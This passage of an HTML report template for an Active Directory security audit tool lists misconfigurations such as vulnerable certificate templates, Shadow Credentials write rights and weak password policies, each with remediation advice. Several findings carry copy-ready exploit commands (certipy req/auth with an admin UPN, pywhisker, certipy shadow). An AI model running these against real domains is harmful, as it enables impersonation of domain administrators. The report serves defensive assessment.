        <td><span class="cvss-score" data-vector="{{.CVSSVector}}" onclick="copyCVSS(this)" data-tip="CVSS:3.1 — click to copy">{{printf "%.1f" .CVSS}}</span></td>
      </tr>
      {{end}}
      </tbody>
    </table>
    </div>
    </div>
  </div>
  {{end}}{{end}}

  <!-- PasswordNotRequired -->
  {{if .HygieneResult}}{{if .HygieneResult.PasswordNotRequired}}
  <div class="exp-section">
    <div class="exp-header" onclick="toggleExpSection(this)">
      <span class="chevron">▼</span>
      <span class="exp-title">Accounts with Password Not Required</span> <span class="help-icon" role="tooltip" tabindex="0" data-tip="UAC flag PASSWD_NOTREQD (0x20) — enabled accounts that can authenticate with an empty password. This is a critical misconfiguration allowing trivial takeover.">?</span>
      <span class="badge badge-critical" style="margin-left:auto">{{len .HygieneResult.PasswordNotRequired}} account(s)</span>
    </div>
    <div class="exp-body">
    <div class="table-wrap">
    <table>
      <thead><tr><th>Account</th><th>Last Logon</th></tr></thead>
      <tbody>
      {{range .HygieneResult.PasswordNotRequired}}
      <tr>
        <td class="mono">{{.SAMAccountName}}</td>
        <td class="mono" style="color:var(--text-muted)">{{if .LastLogon}}{{.LastLogon}}{{else}}Never{{end}}</td>
      </tr>
      {{end}}
      </tbody>
    </table>
    </div>
    </div>
  </div>
  {{end}}{{end}}

  <!-- SmartcardRequired adminCount -->
  {{if .HygieneResult}}{{if .HygieneResult.SmartcardRequired}}
  <div class="exp-section">
    <div class="exp-header" onclick="toggleExpSection(this)">
      <span class="chevron">▼</span>
      <span class="exp-title">Smartcard-Required Admin Accounts</span> <span class="help-icon" role="tooltip" tabindex="0" data-tip="Accounts with SMARTCARD_REQUIRED and adminCount=1: their password hash is set to a random value at smartcard-enforcement and never rotates. The hash remains valid indefinitely for Pass-the-Hash attacks if extracted from LSASS or NTDS.dit.">?</span>
      <span class="badge badge-medium" style="margin-left:auto">{{len .HygieneResult.SmartcardRequired}} account(s)</span>
    </div>
    <div class="exp-body">
    <div class="table-wrap">
    <table>
      <thead><tr><th>Account</th><th>Last Logon</th></tr></thead>
      <tbody>
      {{range .HygieneResult.SmartcardRequired}}
      <tr>
        <td class="mono">{{.SAMAccountName}}</td>
        <td class="mono" style="color:var(--text-muted)">{{if .LastLogon}}{{.LastLogon}}{{else}}Never{{end}}</td>
      </tr>
      {{end}}
      </tbody>
    </table>
    </div>
    </div>
  </div>
  {{end}}{{end}}

  <!-- DnsAdmins -->
  {{if .HygieneResult}}{{if .HygieneResult.DnsAdminsMembers}}
  <div class="exp-section">
    <div class="exp-header" onclick="toggleExpSection(this)">
      <span class="chevron">▼</span>
      <span class="exp-title">DnsAdmins Members</span> <span class="help-icon" role="tooltip" tabindex="0" data-tip="DnsAdmins members can set ServerLevelPluginDll via dnscmd, causing the DNS service (running as SYSTEM on DCs) to load an arbitrary DLL on next restart — DC SYSTEM escalation.">?</span>
      <span class="badge badge-high" style="margin-left:auto">{{len .HygieneResult.DnsAdminsMembers}} member(s)</span>
    </div>
    <div class="exp-body">
    <div class="table-wrap">
    <table>
      <thead><tr><th>Member</th></tr></thead>
      <tbody>
      {{range .HygieneResult.DnsAdminsMembers}}
      <tr><td class="mono">{{.}}</td></tr>
      {{end}}
      </tbody>
    </table>
    </div>
    </div>
  </div>
  {{end}}{{end}}

  <!-- Pre-Windows 2000 Compatible Access -->
  {{if .HygieneResult}}{{if .HygieneResult.PreWin2000AccessEnabled}}
  <div class="exp-section">
    <div class="exp-header" onclick="toggleExpSection(this)">
      <span class="chevron">▼</span>
      <span class="exp-title">Pre-Windows 2000 Compatible Access Enabled</span> <span class="help-icon" role="tooltip" tabindex="0" data-tip="Everyone or Authenticated Users is a member of the Pre-Windows 2000 Compatible Access group. This grants anonymous/unauthenticated LDAP read access to sensitive attributes — a legacy compatibility setting left from pre-AD environments.">?</span>
      <span class="badge badge-high" style="margin-left:auto">Enabled</span>
    </div>
    <div class="exp-body">
      <p style="color:var(--text-sev-high);font-size:0.85rem">Everyone or Authenticated Users is a member of Pre-Windows 2000 Compatible Access. Anonymous sessions can enumerate AD objects including user accounts, groups, and computer accounts. Remove Everyone/Authenticated Users from this group.</p>
    </div>
  </div>
  {{end}}{{end}}

  <!-- PSO -->
  {{if .PSOResult}}{{if .PSOResult.PSOs}}
  <div class="exp-section">
    <div class="exp-header" onclick="toggleExpSection(this)">
      <span class="chevron">▼</span>
      <span class="exp-title">Fine-Grained Password Policy (PSO)</span> <span class="help-icon" role="tooltip" tabindex="0" data-tip="Password Settings Objects (PSOs) override the default domain password policy for specific users or groups. Weaker PSOs applied to service accounts are a common misconfiguration — lower complexity or longer max age increases offline cracking risk.">?</span>
      <span class="badge" style="background:var(--bg-hover);color:var(--text-secondary);margin-left:auto">{{len .PSOResult.PSOs}} PSO(s)</span>
    </div>
    <div class="exp-body">
    <div class="table-wrap">
    <table>
      <thead><tr><th>PSO Name</th><th>Precedence</th><th>Min Length</th><th>Complexity</th><th>Lockout</th><th>Max Age</th><th>Applies To</th><th>Status</th></tr></thead>
      <tbody>
      {{range .PSOResult.PSOs}}
      <tr>
        <td class="mono">{{.Name}}</td>
        <td>{{.Precedence}}</td>
        <td>{{.MinLength}}</td>
        <td>{{if .Complexity}}<span class="badge badge-ok">ON</span>{{else}}<span class="badge badge-critical">OFF</span>{{end}}</td>
        <td>{{if eq .LockoutThreshold 0}}<span class="badge badge-critical">&#8734;</span>{{else}}{{.LockoutThreshold}}{{end}}</td>
        <td>{{if eq .MaxAgeDays 0}}<span class="badge badge-critical">Never</span>{{else}}{{.MaxAgeDays}}d{{end}}</td>
        <td style="font-size:0.78rem;color:var(--text-secondary)">{{joinSPNs .AppliesTo}}</td>
        <td>{{if .IsWeak}}<span class="badge badge-critical">Weak</span>{{else}}<span class="badge badge-ok">OK</span>{{end}}</td>
      </tr>
      {{end}}
      </tbody>
    </table>
    </div>
    </div>
  </div>
  {{end}}{{end}}

  <!-- Protected Users -->
  {{if .ProtectedUsersResult}}
  <div class="exp-section">
    <div class="exp-header" onclick="toggleExpSection(this)">
      <span class="chevron">▼</span>
      <span class="exp-title">Protected Users Group</span>
      <span class="help-icon" role="tooltip" tabindex="0" data-tip="Members of Protected Users cannot authenticate with NTLM, use RC4 encryption, or be subject to unconstrained delegation. DA/EA accounts outside this group are higher-risk credentials.">?</span>
      {{if not .ProtectedUsersResult.ProtectedUsersExists}}
      <span class="badge badge-medium" style="margin-left:auto">Group not found</span>
      {{else if .ProtectedUsersResult.PrivilegedNotProtected}}
      <span class="badge badge-medium" style="margin-left:auto">{{len .ProtectedUsersResult.PrivilegedNotProtected}} privileged not protected</span>
      {{else}}<span class="badge badge-ok" style="margin-left:auto">&#10003; All protected</span>{{end}}
    </div>
    <div class="exp-body">
    {{if not .ProtectedUsersResult.ProtectedUsersExists}}
    <p style="color:var(--text-sev-critical);font-size:0.85rem">&#9888; Protected Users group not found — may not exist in this domain.</p>
    {{else if .ProtectedUsersResult.PrivilegedNotProtected}}
    <div style="color:var(--text-secondary);font-size:0.8rem;margin-bottom:10px">NTLM auth, RC4 encryption, and unconstrained delegation are not blocked for these accounts.</div>
    <div class="table-wrap">
    <table>
      <thead><tr><th>Account</th><th>Severity</th><th>Privileged Groups</th></tr></thead>
      <tbody>
      {{range .ProtectedUsersResult.PrivilegedNotProtected}}
      <tr class="{{if eq .Severity "Critical"}}row-critical{{else}}row-high{{end}}">
        <td class="mono">{{.SAMAccountName}}</td>
        <td><span class="badge {{if eq .Severity "Critical"}}badge-critical{{else}}badge-medium{{end}}">{{.Severity}}</span></td>
        <td style="font-size:0.82rem;color:var(--text-secondary)">{{joinSPNs .Groups}}</td>
      </tr>
      {{end}}
      </tbody>
    </table>
    </div>
    {{else}}
    <p style="color:var(--color-ok)">&#10003; All privileged accounts are in Protected Users ({{len .ProtectedUsersResult.Members}} members).</p>
    {{end}}
    </div>
  </div>
  {{end}}

  <!-- AdminSDHolder -->
  {{if .AdminSDHolderResult}}
  <div class="exp-section">
    <div class="exp-header" onclick="toggleExpSection(this)">
      <span class="chevron">▼</span>
      <span class="exp-title">AdminSDHolder</span>
      <span class="help-icon" role="tooltip" tabindex="0" data-tip="AdminSDHolder ACL is copied to all protected objects every 60 minutes. A custom ACE here is a persistence backdoor. Orphaned adminCount=1 means the object is no longer monitored but still has hardened ACLs.">?</span>
      {{if .AdminSDHolderResult.CustomACEs}}
      <span class="badge badge-critical" style="margin-left:auto">{{len .AdminSDHolderResult.CustomACEs}} backdoor ACE(s)</span>
      {{else if .AdminSDHolderResult.OrphanedAdminCount}}
      <span class="badge" style="background:var(--bg-hover);color:var(--text-secondary);margin-left:auto">{{len .AdminSDHolderResult.OrphanedAdminCount}} orphaned adminCount</span>
      {{else}}<span class="badge badge-ok" style="margin-left:auto">&#10003; Clean</span>{{end}}
    </div>
    <div class="exp-body">
    {{if .AdminSDHolderResult.CustomACEs}}
    <div style="color:var(--text-sev-critical);font-size:0.8rem;margin-bottom:10px">&#9888; These ACEs are replicated to ALL protected objects every 60 min. Remove immediately.</div>
    <div class="table-wrap" style="margin-bottom:12px">
    <table>
      <thead><tr><th>Principal</th><th>SID</th><th>Rights</th><th>CVSS</th></tr></thead>
      <tbody>
      {{range .AdminSDHolderResult.CustomACEs}}
      <tr class="row-critical">
        <td class="mono">{{.PrincipalName}}</td>
        <td class="mono" style="font-size:0.75rem;color:var(--text-muted)">{{.PrincipalSID}}</td>
        <td style="color:var(--color-warn);font-size:0.82rem">{{joinSPNs .Rights}}</td>
        <td><span class="cvss-score" data-vector="{{.CVSSVector}}" onclick="copyCVSS(this)" data-tip="CVSS:3.1 — click to copy">{{printf "%.1f" .CVSS}}</span></td>
      </tr>
      {{end}}
      </tbody>
    </table>
    </div>
    {{end}}
    {{if .AdminSDHolderResult.OrphanedAdminCount}}
    <div style="color:var(--text-secondary);font-size:0.8rem;margin-bottom:8px">adminCount=1 but not in any privileged group — SDProp no longer manages these objects.</div>
    <div class="table-wrap">
    <table>
      <thead><tr><th>Account</th><th>Status</th></tr></thead>
      <tbody>
      {{range .AdminSDHolderResult.OrphanedAdminCount}}
      <tr>
        <td class="mono">{{.SAMAccountName}}</td>
        <td>{{if .Enabled}}<span class="badge badge-medium">enabled</span>{{else}}<span class="badge" style="background:var(--bg-hover);color:var(--text-muted)">disabled</span>{{end}}</td>
      </tr>
      {{end}}
      </tbody>
    </table>
    </div>
    {{end}}
    {{if and (not .AdminSDHolderResult.CustomACEs) (not .AdminSDHolderResult.OrphanedAdminCount)}}
    <p style="color:var(--color-ok)">&#10003; No AdminSDHolder issues found.</p>
    {{end}}
    </div>
  </div>
  {{end}}

</div>

<!-- GPO TAB -->
<div id="tab-gpo" class="tab-pane" role="tabpanel" aria-labelledby="tab-btn-gpo" tabindex="0" aria-hidden="true">
  <div style="display:flex;align-items:center;gap:12px;margin-bottom:16px;flex-wrap:wrap">
    <h2 class="section-title" style="margin-bottom:0;border:none;flex:1;padding-bottom:0">Group Policy Analysis
      <span class="help-icon" role="tooltip" tabindex="0" data-tip="Group Policy controls security settings across the domain: password complexity, lockout thresholds, audit logging. Weak password policy (min length &lt;8, no complexity, no lockout) makes brute-force and spray attacks viable. GPP Preferences may contain encrypted passwords (MS14-025) decryptable with a public AES key.">?</span>
    </h2>
    <div class="xp-btns">
      <button onclick="expandAllIn('#tab-gpo')">Expand all</button>
      <button onclick="collapseAllIn('#tab-gpo')">Collapse all</button>
    </div>
  </div>
  {{if .GPOResult}}

  {{if .GPOResult.DefaultPolicy}}
  <div class="exp-section">
    <div class="exp-header" onclick="toggleExpSection(this)">
      <span class="chevron">▼</span>
      <span class="exp-title">Default Domain Password Policy</span> <span class="help-icon" role="tooltip" tabindex="0" data-tip="The domain-wide password policy applied to all accounts without a PSO. Minimum length &lt; 8, no complexity requirement, or no lockout threshold are critical weaknesses enabling password spraying or brute-force attacks.">?</span>
      {{$pp := .GPOResult.DefaultPolicy}}
      {{if or (lt $pp.MinLength 8) (not $pp.Complexity) (eq $pp.LockoutThreshold 0)}}
      <span class="badge badge-critical" style="margin-left:auto">Weak</span>
      {{else}}<span class="badge badge-ok" style="margin-left:auto">&#10003; OK</span>{{end}}
    </div>
    <div class="exp-body" style="padding:16px">
  {{$pp := .GPOResult.DefaultPolicy}}
  <div class="cards" style="grid-template-columns: repeat(auto-fit, minmax(200px, 1fr))">
    <div class="card {{if lt $pp.MinLength 8}}critical{{else if lt $pp.MinLength 12}}warning{{else}}ok{{end}}">
      <div class="value">{{$pp.MinLength}}</div>
      <div class="label">Min Password Length</div>
    </div>
    <div class="card {{if not $pp.Complexity}}critical{{else}}ok{{end}}">
      <div class="value">{{if $pp.Complexity}}ON{{else}}OFF{{end}}</div>
      <div class="label">Complexity</div>
    </div>
    <div class="card {{if eq $pp.LockoutThreshold 0}}critical{{else if gt $pp.LockoutThreshold 10}}warning{{else}}ok{{end}}">
      <div class="value">{{if eq $pp.LockoutThreshold 0}}∞{{else}}{{$pp.LockoutThreshold}}{{end}}</div>
      <div class="label">Lockout Threshold</div>
    </div>
    <div class="card {{if or (eq $pp.MaxAge 0) (gt $pp.MaxAge 3650)}}critical{{else if gt $pp.MaxAge 90}}warning{{else}}ok{{end}}">
      <div class="value">{{if or (eq $pp.MaxAge 0) (gt $pp.MaxAge 3650)}}∞{{else}}{{$pp.MaxAge}}d{{end}}</div>
      <div class="label">Max Password Age</div>
    </div>
    <div class="card {{if $pp.ReversibleEncryption}}critical{{else}}ok{{end}}">
      <div class="value">{{if $pp.ReversibleEncryption}}ON{{else}}OFF{{end}}</div>
      <div class="label">Reversible Encryption</div>
    </div>
  </div>
    </div>
  </div>
  {{end}}

  {{if .GPOResult.GPOFindings}}
  <div class="exp-section" style="margin-top:10px">
    <div class="exp-header" onclick="toggleExpSection(this)">
      <span class="chevron">▼</span>
      <span class="exp-title">Dangerous GPO Findings {{mitreBadges "gpo_abuse"}}</span>
      <span class="badge badge-high" style="margin-left:auto">{{len .GPOResult.GPOFindings}} findings</span>
    </div>
    <div class="exp-body">
    <div class="table-wrap" style="margin-bottom:0">
    <table>
      <thead>
        <tr><th>GPO Name</th><th>GUID</th><th>Linked To</th><th>Risk</th></tr>
      </thead>
      <tbody>
      {{range .GPOResult.GPOFindings}}
      <tr>
        <td class="mono">{{.Name}}</td>
        <td class="mono" style="font-size:0.75rem">{{.GUID}}</td>
        <td style="font-size:0.8rem">{{joinSPNs .LinkedTo}}</td>
        <td style="color:var(--text-sev-critical);font-size:0.8rem">{{if .RiskReasons}}{{index .RiskReasons 0}}{{else}}—{{end}}</td>
      </tr>
      {{end}}
      </tbody>
    </table>
    </div>
    </div>
  </div>
  {{end}}

  <!-- GPO ACL -->
  {{if .GPOResult}}{{if .GPOResult.GPOACLFindings}}
  <div class="exp-section" style="margin-top:10px">
    <div class="exp-header" onclick="toggleExpSection(this)">
      <span class="chevron">▼</span>
      <span class="exp-title">GPO Write ACL Findings
        <span class="help-icon" role="tooltip" tabindex="0" data-tip="Low-privileged principals with WriteDACL, WriteOwner, GenericAll, or GenericWrite on GPO objects can modify them to add malicious startup scripts, logon tasks, or local admin accounts. GPOs linked to Domain Controllers OU are Critical — compromise affects all DCs.">?</span>
      </span>
      <span class="badge badge-high" style="margin-left:auto">{{len .GPOResult.GPOACLFindings}} findings</span>
    </div>
    <div class="exp-body">
    <div class="table-wrap" style="margin-bottom:0">
    <table>
      <thead><tr><th>GPO</th><th>Severity</th><th>CVSS</th><th>Principal</th><th>Rights</th><th>Linked To</th></tr></thead>
      <tbody>
      {{range .GPOResult.GPOACLFindings}}
      <tr>
        <td class="mono">{{.GPOName}}</td>
        <td><span class="badge {{if eq .Severity "Critical"}}badge-critical{{else}}badge-medium{{end}}">{{.Severity}}</span></td>
        <td><span class="cvss-score" data-vector="{{.CVSSVector}}" onclick="copyCVSS(this)" data-tip="CVSS:3.1 — click to copy">{{printf "%.1f" .CVSS}}</span></td>
        <td class="mono">{{.PrincipalName}}</td>
        <td style="color:var(--color-warn);font-size:0.82rem">{{joinSPNs .Rights}}</td>
        <td style="font-size:0.78rem;color:var(--text-secondary)">{{joinSPNs .GPOLinkedTo}}</td>
      </tr>
      {{end}}
      </tbody>
    </table>
    </div>
    </div>
  </div>
  {{end}}{{end}}

  {{else}}<p style="color:var(--text-muted)">GPO data not available.</p>{{end}}
</div>

<!-- ADCS TAB -->
<div id="tab-adcs" class="tab-pane" role="tabpanel" aria-labelledby="tab-btn-adcs" tabindex="0" aria-hidden="true">
  <div style="display:flex;align-items:center;gap:12px;margin-bottom:16px;flex-wrap:wrap">
    <h2 class="section-title" style="margin-bottom:0;border:none;flex:1;padding-bottom:0">
      Active Directory Certificate Services
      <span class="help-icon" role="tooltip" tabindex="0" data-tip="ADCS misconfigurations allow attackers to forge certificates and authenticate as any domain user including Domain Admins. ESC1: attacker controls Subject Alternative Name → impersonate DA. ESC6: CA-level flag allows SAN injection for all templates. ESC8: NTLM relay to HTTP enrollment endpoint.">?</span>
    </h2>
    <div class="xp-btns">
      <button onclick="expandAllIn('#tab-adcs')">Expand all</button>
      <button onclick="collapseAllIn('#tab-adcs')">Collapse all</button>
    </div>
  </div>

  {{if .ADCSResult}}

  <!-- CAs -->
  <div class="exp-section">
    <div class="exp-header" onclick="toggleExpSection(this)">
      <span class="chevron">▼</span>
      <span class="exp-title">Certificate Authorities</span> <span class="help-icon" role="tooltip" tabindex="0" data-tip="Active Directory Certificate Services (ADCS) — Enterprise CAs issue certificates used for authentication. Columns show ESC6 (EDITF_ATTRIBUTESUBJECTALTNAME2 flag) and ESC8 (HTTP enrollment endpoint) — both allow privilege escalation to Domain Admin.">?</span>
      <span class="badge" style="background:var(--bg-hover);color:var(--text-secondary);margin-left:auto">{{if .ADCSResult.CAs}}{{len .ADCSResult.CAs}} CA(s){{else}}No CAs{{end}}</span>
    </div>
    <div class="exp-body">
    {{if .ADCSResult.CAs}}
    <div class="table-wrap" style="margin-bottom:0">
    <table>
      <thead><tr><th>CA Name</th><th>Server</th><th>ESC6</th><th>ESC8 (check)</th></tr></thead>
      <tbody>
      {{range .ADCSResult.CAs}}
      <tr>
        <td class="mono">{{.Name}}</td>
        <td class="mono" style="color:var(--text-secondary)">{{.Server}}</td>
        <td>{{if gt .EditFlags 262143}}<span class="badge badge-critical">YES</span>{{else}}—{{end}}</td>
        <td style="font-size:0.78rem;color:var(--text-muted)">http://{{.Server}}/certsrv/</td>
      </tr>
      {{end}}
      </tbody>
    </table>
    </div>
    {{else}}<p style="color:var(--text-muted)">No CAs found.</p>{{end}}
    <!-- CA Findings (ESC6) -->
    {{range .ADCSResult.CAFindings}}
    {{if eq (index .VulnTypes 0) "ESC6"}}
    <div class="path-card" style="margin-top:10px">
      <div class="path-header" style="flex-wrap:wrap;gap:8px">
        <span class="badge badge-critical">Critical</span>
        <span class="badge badge-critical" style="font-family:monospace">ESC6</span>
        <span class="cvss-score" data-vector="{{.CVSSVector}}" onclick="copyCVSS(this)" data-tip="CVSS:3.1 — click to copy">{{printf "%.1f" .CVSS}}</span>
        <span class="mono" style="color:var(--text-main)">{{.CAName}}</span>
      </div>
      <div style="padding:8px 16px 16px">
        <div style="color:var(--text-secondary);font-size:0.85rem;margin-bottom:8px">{{.Details}}</div>
        <button class="acc-toggle" onclick="toggleAcc(this)" aria-expanded="false"><span class="acc-chevron">▶</span> <span style="color:var(--text-sev-critical);font-weight:600">Exploit</span> <span style="color:var(--text-muted)">/</span> <span style="color:var(--color-ok);font-weight:600">Remediation</span></button>
        <div class="acc-body">
          <div class="acc-label">Exploit</div>
          <div class="acc-cmd-wrap"><code class="acc-cmd">certipy req -u user@{{$.ADCSResult.Domain}} -p pass -ca {{.CAName}} -template User -upn admin@{{$.ADCSResult.Domain}}</code><button class="acc-cmd-copy" onclick="copyCmd(this)" title="Copy to clipboard">📋</button></div>
          <div class="acc-cmd-wrap" style="margin-top:4px"><code class="acc-cmd">certipy auth -pfx admin.pfx -domain {{$.ADCSResult.Domain}} -dc-ip &lt;DC&gt;</code><button class="acc-cmd-copy" onclick="copyCmd(this)" title="Copy to clipboard">📋</button></div>
          <div class="acc-label" style="margin-top:10px">Fix</div>
          <div style="color:var(--text-secondary)">Run: <code>certutil -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2</code> on CA, then restart CertSvc.</div>
        </div>
      </div>
    </div>
    {{end}}
    {{end}}
    </div>
  </div>

  <!-- Template Findings -->
  <div class="exp-section" style="margin-top:10px">
    <div class="exp-header" onclick="toggleExpSection(this)">
      <span class="chevron">▼</span>
      <span class="exp-title">Vulnerable Templates {{mitreBadges "adcs"}}</span>
      {{if .ADCSResult.TemplateFindings}}
      <span class="badge badge-critical" style="margin-left:auto">{{.Summary.ADCSTemplateCount}} {{plural .Summary.ADCSTemplateCount "template" "templates"}}</span>
      {{else}}<span class="badge badge-ok" style="margin-left:auto">&#10003; None</span>{{end}}
    </div>
    <div class="exp-body" style="padding:12px">
    {{if .ADCSResult.TemplateFindings}}
    {{range .ADCSResult.TemplateFindings}}
    {{$tmplSev := .Severity}}
    <div class="path-card" style="margin-bottom:10px">
      <div class="path-header" style="flex-wrap:wrap;gap:8px">
        <span class="badge {{if eq .Severity "Critical"}}badge-critical{{else}}badge-medium{{end}}">{{.Severity}}</span>
        {{range .VulnTypes}}<span class="badge {{if eq $tmplSev "Critical"}}badge-critical{{else}}badge-medium{{end}}" style="font-family:monospace">{{.}}</span>{{end}}
        <span class="cvss-score" data-vector="{{.CVSSVector}}" onclick="copyCVSS(this)" data-tip="CVSS:3.1 — click to copy">{{printf "%.1f" .CVSS}}</span>
        <span class="mono" style="color:var(--text-main)">{{.TemplateName}}</span>
        {{if .SourceDomain}}<span class="badge" style="background:var(--bg-hover);color:var(--text-muted);font-size:0.75rem">{{.SourceDomain}}</span>{{end}}
        {{if .EnrollableBy}}<span class="badge" style="background:var(--bg-hover);color:var(--color-warn);margin-left:4px">enrollable by: {{range $i,$e := .EnrollableBy}}{{if $i}}, {{end}}{{$e}}{{end}}</span>{{end}}
        {{if .EKUs}}<span class="badge" style="background:var(--bg-hover);color:var(--text-secondary);margin-left:auto">{{range $i,$e := .EKUs}}{{if $i}}, {{end}}{{$e}}{{end}}</span>{{end}}
      </div>
      <div style="padding:0 16px 16px">
        <button class="acc-toggle" onclick="toggleAcc(this)" aria-expanded="false"><span class="acc-chevron">▶</span> <span style="color:var(--text-sev-critical);font-weight:600">Exploit</span> <span style="color:var(--text-muted)">/</span> <span style="color:var(--color-ok);font-weight:600">Remediation</span></button>
        <div class="acc-body">
          <div class="acc-label">Exploit ({{range $i,$v := .VulnTypes}}{{if $i}}, {{end}}{{$v}}{{end}})</div>
          {{if .AllowsSANInject}}
          <div class="acc-cmd-wrap"><code class="acc-cmd">certipy req -u user@{{coalesce .SourceDomain $.ADCSResult.Domain}} -p pass -ca &lt;CA&gt; -template {{.TemplateName}} -upn admin@{{coalesce .SourceDomain $.ADCSResult.Domain}}</code><button class="acc-cmd-copy" onclick="copyCmd(this)" title="Copy to clipboard">📋</button></div>
          <div class="acc-cmd-wrap" style="margin-top:4px"><code class="acc-cmd">certipy auth -pfx admin.pfx -domain {{coalesce .SourceDomain $.ADCSResult.Domain}} -dc-ip &lt;DC&gt;</code><button class="acc-cmd-copy" onclick="copyCmd(this)" title="Copy to clipboard">📋</button></div>
          {{else}}
          <div class="acc-cmd-wrap"><code class="acc-cmd">certipy find -u user@{{coalesce .SourceDomain $.ADCSResult.Domain}} -p pass -dc-ip &lt;DC&gt; -vulnerable</code><button class="acc-cmd-copy" onclick="copyCmd(this)" title="Copy to clipboard">📋</button></div>
          {{end}}
          <div class="acc-label" style="margin-top:10px">Fix</div>
          <div style="color:var(--text-secondary)">Remove CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT from template, restrict enrollment to specific groups, require CA manager approval, or disable the template if unused.</div>
        </div>
      </div>
    </div>
    {{end}}
    {{else}}<p style="color:var(--color-ok)">✓ No vulnerable certificate templates found.</p>{{end}}
    </div>
  </div>

  {{else}}<p style="color:var(--text-muted)">ADCS data not available — run with full enum or use morok adcs command.</p>{{end}}
</div>

<!-- SHADOW CREDENTIALS TAB -->
<div id="tab-shadow" class="tab-pane" role="tabpanel" aria-labelledby="tab-btn-shadow" tabindex="0" aria-hidden="true">
  <h2 class="section-title">
    Shadow Credentials {{mitreBadges "shadow_credentials"}}
    <span class="help-icon" role="tooltip" tabindex="0" data-tip="Shadow Credentials: writing msDS-KeyCredentialLink on a privileged object allows obtaining a TGT without knowing or changing the password. Exploitable via pywhisker or certipy shadow.">?</span>
  </h2>
  {{if .ShadowCredentialsResult}}
    {{if .ShadowCredentialsResult.Findings}}
    <div style="margin-bottom:16px">
      <span class="badge badge-critical">{{len .ShadowCredentialsResult.Findings}} dangerous write ACEs found</span>
    </div>
    <div class="table-wrap">
    <table>
      <thead><tr>
        <th>Principal</th>
        <th>Type</th>
        <th>Domain</th>
        <th>Target</th>
        <th>Target Type</th>
        <th>Right</th>
        <th>Severity</th>
        <th>CVSS</th>
      </tr></thead>
      <tbody>
      {{range .ShadowCredentialsResult.Findings}}
      <tr class="{{if eq .Severity "Critical"}}row-critical{{else}}row-high{{end}}">
        <td class="mono">{{.PrincipalName}}</td>
        <td>{{.PrincipalType}}</td>
        <td class="mono" style="font-size:0.78rem;color:var(--text-muted)">{{.SourceDomain}}</td>
        <td class="mono">{{.TargetName}}</td>
        <td>{{.TargetType}}</td>
        <td><span class="badge badge-medium" style="font-family:monospace;font-size:0.75rem">{{.Right}}</span></td>
        <td><span class="badge badge-critical">{{.Severity}}</span></td>
        <td><span class="cvss-score" data-vector="{{.CVSSVector}}" onclick="copyCVSS(this)" data-tip="CVSS:3.1 — click to copy">{{printf "%.1f" .CVSS}}</span></td>
      </tr>
      {{end}}
      </tbody>
    </table>
    </div>
    <div class="path-card" style="margin-top:16px">
      <div class="path-header" style="flex-wrap:wrap;gap:8px">
        <span class="badge badge-critical">Shadow Credentials</span>
        <span style="color:var(--text-main);font-weight:600">{{len .ShadowCredentialsResult.Findings}} abusable write ACE(s) on msDS-KeyCredentialLink</span>
      </div>
      <div style="padding:4px 16px 16px">
        <button class="acc-toggle" onclick="toggleAcc(this)" aria-expanded="false"><span class="acc-chevron">▶</span> <span style="color:var(--text-sev-critical);font-weight:600">Exploit</span> <span style="color:var(--text-muted)">/</span> <span style="color:var(--color-ok);font-weight:600">Remediation</span></button>
        <div class="acc-body">
          <div class="acc-label">Exploit</div>
          <div class="acc-cmd-wrap"><code class="acc-cmd">pywhisker -d {{.ShadowCredentialsResult.Domain}} -u '&lt;principal&gt;' -p '&lt;pass&gt;' --target '&lt;target&gt;' --action add</code><button class="acc-cmd-copy" onclick="copyCmd(this)" title="Copy to clipboard">📋</button></div>
          <div class="acc-cmd-wrap" style="margin-top:4px"><code class="acc-cmd">certipy shadow auto -u '&lt;principal&gt;@{{.ShadowCredentialsResult.Domain}}' -p '&lt;pass&gt;' -account '&lt;target&gt;'</code><button class="acc-cmd-copy" onclick="copyCmd(this)" title="Copy to clipboard">📋</button></div>
          <div class="acc-label" style="margin-top:10px">Fix</div>
          <div style="color:var(--text-secondary)">Audit msDS-KeyCredentialLink write ACEs on privileged objects. Remove unnecessary write permissions. Monitor for unauthorized key credential additions via event 5136.</div>
        </div>
      </div>
    </div>
    {{else}}
    <p style="color:var(--color-ok)">✓ No dangerous write ACEs on msDS-KeyCredentialLink found.</p>
    {{end}}
  {{else}}
  <p style="color:var(--text-muted)">Shadow Credentials data not available.</p>
  {{end}}
</div>

<!-- LDAP SECURITY TAB -->
<div id="tab-ldapsec" class="tab-pane" role="tabpanel" aria-labelledby="tab-btn-ldapsec" tabindex="0" aria-hidden="true">
  <h2 class="section-title">
    LDAP Security {{mitreBadges "ldap_relay"}}
    <span class="help-icon" role="tooltip" tabindex="0" data-tip="LDAP signing prevents man-in-the-middle attacks on LDAP traffic. If signing is not enforced, an attacker between the client and DC can read or modify LDAP requests. NTLM relay to LDAP (via PetitPotam/Coercer) is possible when signing and channel binding are not enforced.">?</span>
  </h2>
  {{if .LDAPSecurityResult}}
  <div class="table-wrap" style="margin-bottom:20px"><table>
    <thead><tr><th>Setting</th><th>Status</th></tr></thead>
    <tbody>
      <tr>
        <td>Transport</td>
        <td>{{if .LDAPSecurityResult.PlainLDAP}}<span class="badge badge-medium">plain LDAP port 389</span>{{else}}<span class="badge" style="background:var(--bg-hover);color:var(--color-ok)">LDAPS port 636</span>{{end}}</td>
      </tr>
      <tr>
        <td>LDAP signing</td>
        <td>{{if not .LDAPSecurityResult.SigningChecked}}<span class="badge" style="background:var(--bg-hover);color:var(--color-muted)">? unknown (LDAPS)</span>{{else if .LDAPSecurityResult.SigningEnforced}}<span class="badge" style="background:var(--bg-hover);color:var(--color-ok)">✓ enforced</span>{{else}}<span class="badge badge-medium">⚠ NOT enforced</span>{{end}}</td>
      </tr>
      <tr>
        <td>SASL mechanisms</td>
        <td class="mono" style="font-size:0.82rem">{{range $i,$m := .LDAPSecurityResult.SASLMechanisms}}{{if $i}}, {{end}}{{$m}}{{end}}</td>
      </tr>
      <tr>
        <td>Capabilities (OIDs)</td>
        <td class="mono" style="font-size:0.75rem">{{range $i,$c := .LDAPSecurityResult.Capabilities}}{{if $i}}<br>{{end}}{{$c}}{{end}}</td>
      </tr>
    </tbody>
  </table></div>
  {{if .LDAPSecurityResult.Findings}}
  <div style="font-size:11px;font-weight:500;color:var(--text-muted);text-transform:uppercase;letter-spacing:.06em;margin-bottom:8px">Findings</div>
  {{range .LDAPSecurityResult.Findings}}
  <div class="path-card" style="margin-bottom:10px">
    <div class="path-header" style="flex-wrap:wrap;gap:8px">
